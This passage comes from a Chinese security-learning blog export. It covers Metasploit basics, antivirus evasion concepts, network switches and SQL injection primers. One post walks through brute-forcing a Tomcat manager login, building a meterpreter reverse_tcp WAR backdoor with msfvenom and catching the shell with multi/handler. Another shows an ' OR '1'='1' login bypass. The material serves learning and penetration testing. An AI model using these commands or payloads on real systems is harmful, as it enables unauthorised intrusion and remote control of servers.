title="使用tomcat后台爆破模块爆破后台登录密码"></a>使用tomcat后台爆破模块爆破后台登录密码</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts x.x.x.x</span><br><span class="line"><span class="built_in">set</span> threads <span class="number">10</span></span><br><span class="line"><span class="built_in">set</span> bruteforce_speed <span class="number">5</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726120642964.png" alt="image-20230726120642964"></p><blockquote><p>show options 查看待设置参数时留意用户名字典和密码字典。可以根据实际情况自己更换。</p></blockquote><p>爆破结果需要自己翻找</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726120847727.png" alt="image-20230726120847727"></p><p>利用爆破出来的用户名密码登录tomcat后台管理界面</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726120950196.png" alt="image-20230726120950196"></p><p>找到上传点</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726121534414.png" alt="image-20230726121534414"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726121403095.png" alt="image-20230726121403095"></p><h3 id="使用msf毒液（msfvenom）制作木马"><a href="#使用msf毒液（msfvenom）制作木马" class="headerlink" title="使用msf毒液（msfvenom）制作木马"></a>使用msf毒液（msfvenom）制作木马</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxxx -f war -o kali.war</span><br></pre></td></tr></table></figure><p>制作木马文件kali.war</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726141941904.png" alt="image-20230726141941904"></p><h3 id="使用handler模块监听端口等待连接"><a href="#使用handler模块监听端口等待连接" class="headerlink" title="使用handler模块监听端口等待连接"></a>使用handler模块监听端口等待连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost x.x.x.x</span><br><span class="line"><span class="built_in">set</span> lport xxxx</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726143540104.png" alt="image-20230726143540104"></p><h3 id="tomcat后台部署上传的木马"><a href="#tomcat后台部署上传的木马" class="headerlink" title="tomcat后台部署上传的木马"></a>tomcat后台部署上传的木马</h3><p>部署应用</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726143718287.png" alt="image-20230726143718287"></p><p>点击访问</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726143758363.png" alt="image-20230726143758363"></p><p>handler模块监听到目标连接</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726143918781.png" alt="image-20230726143918781"></p><h3 id="查看目标信息"><a href="#查看目标信息" class="headerlink" title="查看目标信息"></a>查看目标信息</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726144139431.png" alt="image-20230726144139431"></p><h3 id="接下来就可以利用meterpreter进行进一步的操作了"><a href="#接下来就可以利用meterpreter进行进一步的操作了" class="headerlink" title="接下来就可以利用meterpreter进行进一步的操作了"></a>接下来就可以利用meterpreter进行进一步的操作了</h3>]]></content>
      
      
      <categories>
          
          <category> 免杀技术 </category>
          
          <category> msf实践案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf工具基础</title>
      <link href="/2023/07/12/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/12/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="MSF工具"><a href="#MSF工具" class="headerlink" title="MSF工具"></a>MSF工具</h2><blockquote><p>msf：metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</p></blockquote><p>它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具</p><p>一般kali里面就集成了msf工具，安装了kali就会带有它</p><p>我打算通过借助msf工具来初步学习免杀</p><h3 id="msf自带的核心模块"><a href="#msf自带的核心模块" class="headerlink" title="msf自带的核心模块"></a>msf自带的核心模块</h3><ul><li>exploit 利用模块</li><li>payload 攻击载荷模块</li><li>auxiliary 辅助模块</li><li>post 后渗透模块</li><li>encoders 编码模块</li><li>evasion 免杀模块</li><li>nops 空模块</li></ul><h3 id="kali-下msf常用模块所在目录"><a href="#kali-下msf常用模块所在目录" class="headerlink" title="kali 下msf常用模块所在目录"></a>kali 下msf常用模块所在目录</h3><blockquote><p>kali 下msf默认安装目录    /usr/share/metasploit-framework</p><p>模块所在目录    /usr/share/metasploit-framework/modules</p><p>​    例如exploits模块所在目录    /usr/share/metasploit-framework/modules/exploits</p></blockquote><p>每个模块对应的文件都能在对应的目录下找到</p><h4 id="exploits利用模块"><a href="#exploits利用模块" class="headerlink" title="exploits利用模块"></a>exploits利用模块</h4><ul><li>active exploit 直接攻击，适用于服务端</li><li>passive exploit 放置攻击代码运行，适用于客户端</li></ul><p>目录: /usr/share/metasploit-framework/modules/exploits</p><p>命令: show exploits</p><h4 id="payloads攻击载荷"><a href="#payloads攻击载荷" class="headerlink" title="payloads攻击载荷"></a>payloads攻击载荷</h4><ul><li>single: 完整独立的payload</li><li>stager: 用于建立连接和下载</li><li>stage: stager连接后下载的payload</li></ul><p>目录：/usr/share/metasploit-framework/modules/payloads</p><p>命令：show payloads</p><h4 id="auxiliary辅助模块"><a href="#auxiliary辅助模块" class="headerlink" title="auxiliary辅助模块"></a>auxiliary辅助模块</h4><ul><li>用于辅助渗透，如扫描、口令猜解、敏感信息嗅探等等。主要用于信息收集阶段。</li></ul><p>目录： /usr/share/metasploit-framework/modules/auxiliary</p><p>命令： show auxiliary</p><h4 id="encoders编码器模块"><a href="#encoders编码器模块" class="headerlink" title="encoders编码器模块"></a>encoders编码器模块</h4><ul><li>对payload进行编码加密，可以绕过部分杀毒软件（效果差）</li></ul><h4 id="evasion免杀模块"><a href="#evasion免杀模块" class="headerlink" title="evasion免杀模块"></a>evasion免杀模块</h4><ul><li>用于生成（windows平台）免杀的木马（效果差）</li></ul><h4 id="nops空模块"><a href="#nops空模块" class="headerlink" title="nops空模块"></a>nops空模块</h4><ul><li>用于填充空格、产生延迟、干扰验证等</li></ul><h3 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show + 模块名字展示信息</span><br><span class="line">help /? 查看所有命令帮助，help+命令</span><br><span class="line">search 搜索漏洞和利用数据库</span><br><span class="line">info    信息</span><br><span class="line">use 使用模块</span><br><span class="line">show options查看所使用模块需要配置的参数</span><br><span class="line">set设置参数值</span><br><span class="line">run执行模块</span><br></pre></td></tr></table></figure><h4 id="常用命令search"><a href="#常用命令search" class="headerlink" title="常用命令search"></a>常用命令search</h4><ul><li>查找永恒之蓝漏洞：search ms17_010</li><li>查找08年漏洞： search cve:2008</li></ul><h4 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h4><p>搜索数据库网站的内容</p><p>​    例：searchsploit “Spring Cloud Gateway 3.1.0”</p><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><h5 id="选择一个模块使用"><a href="#选择一个模块使用" class="headerlink" title="选择一个模块使用"></a>选择一个模块使用</h5><p>例：use auxiliary/admin/smb/ms17_010_command</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712162330302.png" alt="image-20230712162330302"></p><p>红色部分代表当前已经在使用这个模块了</p><h5 id="可以使用show-options命令查看必填参数"><a href="#可以使用show-options命令查看必填参数" class="headerlink" title="可以使用show options命令查看必填参数"></a>可以使用show options命令查看必填参数</h5><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712162531913.png" alt="image-20230712162531913"></p><p>显示当前参数的表格</p><h5 id="设置参数，以设置rhosts为例："><a href="#设置参数，以设置rhosts为例：" class="headerlink" title="设置参数，以设置rhosts为例："></a>设置参数，以设置rhosts为例：</h5><p>set rhosts 192.168.3.18</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712163304586.png" alt="image-20230712163304586"></p><h5 id="取消设置，以取消rhost的设置为例"><a href="#取消设置，以取消rhost的设置为例" class="headerlink" title="取消设置，以取消rhost的设置为例"></a>取消设置，以取消rhost的设置为例</h5><p>unset rhosts</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712163427227.png" alt="image-20230712163427227"></p><h5 id="使用模块进行攻击"><a href="#使用模块进行攻击" class="headerlink" title="使用模块进行攻击"></a>使用模块进行攻击</h5><p>设置好模块所需要的参数以后，直接run（演示）</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712164101598.png" alt="image-20230712164101598"></p><h5 id="回到msf主界面"><a href="#回到msf主界面" class="headerlink" title="回到msf主界面"></a>回到msf主界面</h5><p>使用back回到msf主界面</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712164150155.png" alt="image-20230712164150155"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀技术 </category>
          
          <category> msf工具基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf模块使用</title>
      <link href="/2023/07/12/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/12/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="msf模块使用"><a href="#msf模块使用" class="headerlink" title="msf模块使用"></a>msf模块使用</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="所使用的模块"><a href="#所使用的模块" class="headerlink" title="所使用的模块"></a>所使用的模块</h3><p>msf下用于做主机发现的模块：auxiliary/scanner/discovery/arp_sweep</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>设置ip网段，run</p><p>例：</p><p>查看当前参数： show options</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712165830969.png" alt="image-20230712165830969"></p><p>设置ip网段： set RHOSTS 192.168.3.1/24</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712170216820.png" alt="image-20230712170216820"></p><p>润！：run（线程数太少会很慢，先设置成50最好）</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712170533325.png" alt="image-20230712170533325"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="所使用的模块（这里扫描tcp）"><a href="#所使用的模块（这里扫描tcp）" class="headerlink" title="所使用的模块（这里扫描tcp）"></a>所使用的模块（这里扫描tcp）</h3><p>auxiliary/scanner/portscan/tcp </p><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>show option查看待设置的参数（待扫描的ip），设置好就能润了</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712171547382.png" alt="image-20230712171547382"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><h3 id="所使用模块"><a href="#所使用模块" class="headerlink" title="所使用模块"></a>所使用模块</h3><p>auxiliary/scanner/http/dir_scanner</p><h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><ul><li>设置待扫描主机ip</li><li>设置默认端口号</li><li>设置线程数</li><li>润</li></ul><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230712172441692.png" alt="image-20230712172441692"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>将默认字典里的常用字段（如bank、code）拼接到根目录url的后面，并逐个进行访问，访问成功则说明有这个目录。</p><p>在实际使用过程中可以修改所使用的字典达到更好的扫描效果。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>msf模块使用通用流程：</p><ol><li>search 命令查找要使用的模块</li><li>use 命令使用这个模块</li><li>show options 命令查看这个模块待设置的参数</li><li>set 命令设置好参数</li><li>run 命令运行</li></ol>]]></content>
      
      
      <categories>
          
          <category> 免杀技术 </category>
          
          <category> msf模块使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀基础</title>
      <link href="/2023/07/09/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/09/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀基础"><a href="#免杀基础" class="headerlink" title="免杀基础"></a>免杀基础</h1><h2 id="免杀的概念"><a href="#免杀的概念" class="headerlink" title="免杀的概念"></a>免杀的概念</h2><blockquote><p>免杀，也就是反病毒(AntiVirus)与反间谍(AntiSpyware)的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。 也就是我们常说的bypass AV</p></blockquote><h2 id="杀毒软件分类"><a href="#杀毒软件分类" class="headerlink" title="杀毒软件分类"></a>杀毒软件分类</h2><h3 id="免费版"><a href="#免费版" class="headerlink" title="免费版"></a>免费版</h3><p>360安全卫士、火绒、电脑管家等等</p><h3 id="收费版"><a href="#收费版" class="headerlink" title="收费版"></a>收费版</h3><p>也称为企业版（EDR）。对比免费版，企业版的查杀更为严格，特别是针对内存的查杀，比如：卡巴斯基、ESET(NOD32)等等</p><h2 id="杀软检测的方式"><a href="#杀软检测的方式" class="headerlink" title="杀软检测的方式"></a>杀软检测的方式</h2><h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><ul><li>扫描压缩包，对压缩包文件进行分析检查</li><li>程序防篡改，避免程序或文件被恶意程序篡改</li><li>修复技术，对恶意程序所破坏的文件进行还原</li><li>智能扫描，扫描常用磁盘，系统关键位置，时间短</li><li>全盘扫描，扫描电脑全盘文件，时间长</li><li>勒索软件防护，保护电脑不受勒索软件的攻击</li><li>开机扫描，电脑开机时自动扫描，可以扫描压缩文档和不需要的程序</li></ul><h3 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a>监控技术</h3><ul><li>内存监控，监控内存中的数据，监控所有进程，当发现内存中存在病毒的时候，就会主动报警</li><li>文件监控，当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警</li><li>邮件监控，当发现邮件的附件存在病毒时进行拦截</li><li>网页防护，阻止网络攻击和不安全下载</li><li>行为防护，提醒用户可疑的应用程序行为</li></ul><h2 id="常见术语介绍"><a href="#常见术语介绍" class="headerlink" title="常见术语介绍"></a>常见术语介绍</h2><ul><li>漏洞 vulnerability</li><li>渗透测试 penatration test</li><li>利用 exploit 渗透攻击</li><li>提权 privilege escalation</li><li>攻击载荷 payload</li><li>免杀 anti-antivirus</li><li>后渗透 post-exploitation</li></ul><h2 id="检测能否免杀"><a href="#检测能否免杀" class="headerlink" title="检测能否免杀"></a>检测能否免杀</h2><p>如果怀疑一个文件或软件是否是病毒或存在后门（可以用于检测自制文件是否会被杀），可以使用的在线检测工具：</p><blockquote><p>virustotal.com</p><p> s.threatbook.com</p></blockquote><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><ul><li>确定目标<ul><li>资产范围</li><li>测试方法</li><li>要求</li><li>限制</li></ul></li><li>信息收集<ul><li>域名</li><li>子域名</li><li>ip</li><li>端口</li><li>网站目录</li><li>旁站</li><li>c段</li><li>网站架构</li><li>软件版本</li></ul></li><li>漏洞分析（威胁建模）<ul><li>根据软件版本</li><li>基于漏洞数据库</li><li>根据已挖掘的新漏洞</li></ul></li><li>漏洞利用<ul><li>获得权限或者文件数据</li></ul></li><li>提权（渗透测试报告）<ul><li>提升至管理员权限</li></ul></li><li>后渗透（清理痕迹）<ul><li>扩大战果，维持权限</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 免杀技术 </category>
          
          <category> 免杀基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E4%BA%A4%E6%8D%A2%E6%9C%BA/"/>
      <url>/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E4%BA%A4%E6%8D%A2%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><blockquote><p>Ethernet 10Mb/s</p><p>FastEthernet 100Mb/</p><p>GigabitEthernet 1000Mb/s</p><p>TenGigabitEthernet 10000Mb/s</p></blockquote><h4 id="特殊接口"><a href="#特殊接口" class="headerlink" title="特殊接口"></a>特殊接口</h4><blockquote><p>console 接口： 用来初始化管理电脑的接口</p></blockquote><h4 id="思科机器命名"><a href="#思科机器命名" class="headerlink" title="思科机器命名"></a>思科机器命名</h4><p>一般思科的交换机开头的数字就表明这台机器是工作在第几层的</p><p>如：</p><blockquote><p>2960 — 这是一台工作在第二层的机器</p></blockquote><h4 id="工作在第三层以上的机器才能配ip地址"><a href="#工作在第三层以上的机器才能配ip地址" class="headerlink" title="工作在第三层以上的机器才能配ip地址"></a>工作在第三层以上的机器才能配ip地址</h4><h4 id="家用路由器"><a href="#家用路由器" class="headerlink" title="家用路由器"></a>家用路由器</h4><p>家用路由器实际上是一种三层交换机，严格上算是交换机和路由器的杂交产品。</p><p>家用路由器通常有五个端口，其中有一个连接外网。其余四个连接内网。</p><p>这四个端口是二层端口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础</title>
      <link href="/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h2 id="一、-原理"><a href="#一、-原理" class="headerlink" title="一、 原理"></a>一、 原理</h2><p>SQL注入原理：</p><blockquote><p>SQL注入利用了程序未能正确过滤、转义或验证用户输入的情况。攻击者通过在用户输入中插入恶意的SQL代码，改变原始查询的逻辑，从而实现对数据库的非法操作。</p></blockquote><h2 id="二、-注入点"><a href="#二、-注入点" class="headerlink" title="二、 注入点"></a>二、 注入点</h2><p>注入点：</p><blockquote><p>注入点是指程序中的用户输入接收点，通常是网页表单、URL参数或其他用户可控的输入字段。攻击者会利用这些输入点，注入恶意代码来攻击数据库。</p></blockquote><h2 id="三、分类"><a href="#三、分类" class="headerlink" title="三、分类"></a>三、分类</h2><ol><li><p>基于错误的注入：</p><blockquote><p>攻击者通过构造恶意输入，使得SQL语句执行出错，从而获取错误信息，包括数据库结构、数据内容等敏感信息。</p></blockquote></li><li><p>基于布尔盲注的注入：</p><blockquote><p>攻击者通过构造恶意输入，利用SQL语句执行结果的布尔值（真或假）来推断出数据库中的信息，逐步获取数据。</p></blockquote></li><li><p>基于时间盲注的注入：</p><blockquote><p>攻击者通过构造恶意输入，利用SQL语句的执行时间来推断出数据库中的信息，例如通过延迟执行的SQL语句来判断条件是否满足。</p></blockquote></li><li><p>基于联合查询的注入：</p><blockquote><p>攻击者通过在注入点构造特殊的查询语句，利用UNION操作将额外的查询结果合并到原始查询结果中，从而获取额外的数据。</p></blockquote></li><li><p>基于堆叠查询的注入：</p><blockquote><p>攻击者通过在注入点构造多个SQL查询语句，并利用数据库的批处理功能，将这些查询语句一次性执行，实现多个查询的注入效果。</p></blockquote></li><li><p>基于命令执行的注入：</p><blockquote><p>当应用程序允许用户输入执行系统命令的参数时，攻击者可以通过注入恶意输入来执行任意系统命令，从而控制服务器或获取敏感信息。</p></blockquote></li></ol><h2 id="四、SQL查询语句的篡改"><a href="#四、SQL查询语句的篡改" class="headerlink" title="四、SQL查询语句的篡改"></a>四、SQL查询语句的篡改</h2><blockquote><p>攻击者可以通过注入语句来修改原始的SQL查询语句，常见的注入方式包括注释符号（<code>--</code>）、逻辑运算符（<code>AND</code>、<code>OR</code>）、UNION查询等。</p></blockquote><p>例子：</p><p>假设有一个登录页面，用户可以通过输入用户名和密码进行登录。后台使用以下SQL查询语句来验证用户的登录信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;输入的用户名&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;输入的密码&#x27;</span></span><br></pre></td></tr></table></figure><p>攻击者可以利用SQL注入漏洞，通过恶意输入来篡改这个查询语句。例如，如果用户名输入框中输入了 <code>&#39; OR &#39;1&#39;=&#39;1&#39; -- a</code>，密码输入框中输入任意值，则构造出的查询语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">-- a&#x27; AND password = &#x27;输入的密码&#x27;</span></span><br></pre></td></tr></table></figure><p>这样，攻击者成功将查询的逻辑改变。<code>&#39; OR &#39;1&#39;=&#39;1&#39;</code> 这部分代码绕过了原本的用户名验证，使得查询语句变成了一个始终返回真值的条件，从而绕过了密码的验证。注释符号 <code>--</code> 用于注释掉原本的查询语句部分，避免产生语法错误。</p><p>通过这样的注入，攻击者可以绕过身份验证，获得未授权访问系统的权限，可能导致数据泄露、信息损坏或越权访问等安全问题。</p><h2 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h2><p>为了防止SQL注入攻击，开发人员应该采取以下措施：</p><ul><li><p>使用参数化查询或预编译语句，避免直接拼接用户输入</p></li><li><p>对用户输入进行严格的验证和过滤，使用白名单机制限制输入</p></li><li><p>限制数据库用户的权限，避免攻击者利用注入获得敏感信息</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（一）</title>
      <link href="/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入（一）"><a href="#SQL注入（一）" class="headerlink" title="SQL注入（一）"></a>SQL注入（一）</h1><h2 id="步骤与流程"><a href="#步骤与流程" class="headerlink" title="步骤与流程"></a>步骤与流程</h2><ol><li>判断漏洞是否存在</li><li>判断注入类型</li><li>判断表中列数</li><li>确定显示位</li><li>获取数据<ol><li>获取数据库名、版本</li><li>获取数据库表名</li><li>获取某个表的字段名</li><li>获取字段中的记录</li></ol></li></ol><hr><h3 id="判断漏洞是否存在"><a href="#判断漏洞是否存在" class="headerlink" title="判断漏洞是否存在"></a>判断漏洞是否存在</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><blockquote><p>根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说 明存在注入漏洞。</p><p>一般利用单引号（’）或者双引号（”）来判断是否存在漏洞，如果出现SQL语句错误说明有很大的可能会 存在漏洞。</p></blockquote><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>若后端通过下面语句向数据库获取数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure><p>正常执行的结果会把符合要求的user_id回显。</p><p>然而，如果此时 ‘$id’的值为“ 1‘ ”，那么SQL语句就会变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name,last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;&#x27;;</span></span><br></pre></td></tr></table></figure><p>多了一个单引号，因为单引号不匹配，则会报错。如果能引起数据库的报错，说明用户是<em><strong>可以 对查询语句进行修改</strong></em>的，说明存在漏洞。</p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>因为查询语句可以分成查数字和查字符两种。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> x <span class="keyword">FROM</span> t <span class="keyword">WHERE</span> id <span class="operator">=</span> xxx;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> x <span class="keyword">FROM</span> t <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>如果是字符型，若想进行注入，那就应该对引号进行闭合。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote><p>判断注入类型是数字型还是字符型，这涉及到在注入的过程中是否需要添加单引号，可以使用and（ 逻 辑与）进行判断，，当条件表达式两边都为真才是真，有一边为假则是假</p></blockquote><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><blockquote><ul><li><p>1 and 1=1</p></li><li><p>1 and 1=2</p></li></ul><p>如果输入“1 and 1=1”和“1 and 1=2”页面的查询结果都返回相同的内容，说明不是数字型注入。既然不是 数字型，那就有很大的可能是字符型注入了。</p><p>如果是字符型则需要对单引号（’）进行闭合，因为MySQL中的引号都是成双成对出现的。</p></blockquote><p>当用户输入上方的判断语句时，如果是数字型注入，则SQL 语句变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>如果是字符型注入，则变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 